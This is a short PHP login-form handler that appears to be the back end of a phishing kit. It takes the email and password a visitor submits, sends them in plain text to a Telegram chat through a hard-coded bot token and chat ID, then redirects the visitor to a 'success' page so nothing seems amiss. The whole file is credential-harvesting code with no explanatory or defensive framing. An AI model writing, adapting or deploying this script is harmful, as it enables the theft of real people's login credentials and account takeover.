<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $botToken = "7693366029:AAF_HZzdqPqkF1LlmNjA9O8-TbdOhPPcgyk";
    $chatId = "7182702425";

    $message = "New Login Attempt:\nEmail: $email\nPassword: $password";

    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    file_get_contents($url);

    header("Location: success.html");
    exit();
}
?>